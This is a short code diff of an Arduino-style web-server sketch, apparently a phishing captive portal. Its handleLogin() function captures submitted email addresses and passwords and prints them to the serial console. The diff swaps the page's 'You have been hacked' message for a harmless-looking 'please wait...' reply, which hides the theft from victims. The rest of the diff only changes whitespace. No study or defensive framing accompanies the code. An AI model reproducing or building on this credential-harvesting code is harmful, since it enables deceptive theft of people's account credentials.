@@ -122,8 +122,8 @@ void printSuper() {
                                                                                                                                                                       
                                                                                                                                                                                                                                                                                                                                           
   )rawliteral"));
-  delay(1000);
-  }
+delay(1000);
+}
 
 // ========== WAIT FOR SERIAL INPUT ==========
 void waitForSerialInput() {
@@ -151,14 +151,14 @@ void handleLogin() {
   String pass = server.arg("password");
   Serial.println("📧 Email: " + email);
   Serial.println("🔐 Password: " + pass);
-  server.send(200, "text/html", "<h3>Warning: You have been hacked</h3>");
+  server.send(200, "text/html", "<h3>please wait...</h3>");
 }
 
 // ========== SETUP ==========
 void setup() {
   Serial.begin(115200);
   delay(1000);
-  
+
   printSuper();
   waitForSerialInput();
 
